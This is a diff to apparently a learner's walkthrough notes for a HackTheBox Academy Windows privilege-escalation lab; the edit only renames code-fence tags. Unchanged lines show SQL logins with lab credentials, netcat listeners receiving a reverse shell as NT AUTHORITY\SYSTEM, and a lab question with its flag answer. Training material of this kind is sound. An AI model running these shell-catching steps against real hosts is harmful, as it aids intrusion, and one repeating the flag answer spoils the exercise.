@@ -7,7 +7,7 @@ Legitimate programs may utilize another process's token to escalate from Adminis
 ### Connecting with MSSQLClient.py
 Using the credentials `sql_dev`:`Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. 
 
-```sh
+```shellsession
 $ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
 
 Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
@@ -81,7 +81,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
 ### Catching SYSTEM Shell
 This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.
 
-```sh
+```shellsession
 $ sudo nc -lnvp 8443
 
 listening on [any] 8443 ...
@@ -125,7 +125,7 @@ NULL
 
 ### Catching Reverse Shell as SYSTEM
 
-```sh
+```shellsession
 $ nc -lnvp 8443
 
 listening on [any] 8443 ...
@@ -144,7 +144,7 @@ nt authority\system
 Authenticate to 10.129.84.192 (ACADEMY-WINLPE-SRV01), with user `sql_dev` and password `Str0ng_P@ssw0rd!`
 1. Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt **Answer: F3ar_th3_p0tato**
    - Connect to the SQL server, enable xp_cmdshell and check our privileges → `SeImpersonate` enabled:
-        ```sh
+        ```shellsession
         $ mssqlclient.py sql_dev@10.129.84.192 -windows-auth
         Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 
 
@@ -195,7 +195,7 @@ Authenticate to 10.129.84.192 (ACADEMY-WINLPE-SRV01), with user `sql_dev` and pa
         NULL
         ```
    - Catch the shell and read the flag:
-        ```sh
+        ```shellsession
         $ nc -nlvp 8443
         Listening on 0.0.0.0 8443
         Connection received on 10.129.84.192 49730
